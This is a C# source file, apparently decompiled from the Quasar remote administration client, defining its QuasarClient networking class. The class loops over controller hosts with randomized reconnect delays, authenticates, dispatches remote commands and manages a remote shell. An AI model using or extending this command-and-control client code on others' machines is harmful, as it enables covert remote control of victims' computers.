using System;
using System.Threading;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core.Commands;
using xClient.Core.Data;
using xClient.Core.NetSerializer;
using xClient.Core.Packets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Utilities;

namespace xClient.Core.Networking;

public class QuasarClient : Client
{
	private readonly HostsManager _hosts;

	public static bool Exiting { get; private set; }

	public bool Authenticated { get; private set; }

	public QuasarClient(HostsManager hostsManager)
	{
		_hosts = hostsManager;
		base.Serializer = new Serializer(PacketRegistery.GetPacketTypes());
		base.ClientState += OnClientState;
		base.ClientRead += OnClientRead;
		base.ClientFail += OnClientFail;
	}

	public void Connect()
	{
		while (true)
		{
			if (!Exiting)
			{
				if (!base.Connected)
				{
					Thread.Sleep(100 + new Random().Next(0, 250));
					Host nextHost = _hosts.GetNextHost();
					Connect(nextHost.IpAddress, nextHost.Port);
					Thread.Sleep(200);
					Application.DoEvents();
				}
				while (base.Connected)
				{
					Application.DoEvents();
					Thread.Sleep(2500);
				}
				if (Exiting)
				{
					break;
				}
				Thread.Sleep(Settings.RECONNECTDELAY + new Random().Next(250, 750));
				continue;
			}
			return;
		}
		Disconnect();
	}

	private void OnClientRead(Client client, IPacket packet)
	{
		Type type = packet.GetType();
		if (!Authenticated)
		{
			if (type == typeof(GetAuthentication))
			{
				CommandHandler.HandleGetAuthentication((GetAuthentication)packet, client);
			}
			else if (type == typeof(SetAuthenticationSuccess))
			{
				Authenticated = true;
			}
		}
		else
		{
			PacketHandler.HandlePacket(client, packet);
		}
	}

	private void OnClientFail(Client client, Exception ex)
	{
		client.Disconnect();
	}

	private void OnClientState(Client client, bool connected)
	{
		Authenticated = false;
		if (!connected && !Exiting)
		{
			LostConnection();
		}
	}

	private void LostConnection()
	{
		CommandHandler.CloseShell();
	}

	public void Exit()
	{
		Exiting = true;
		Disconnect();
	}
}
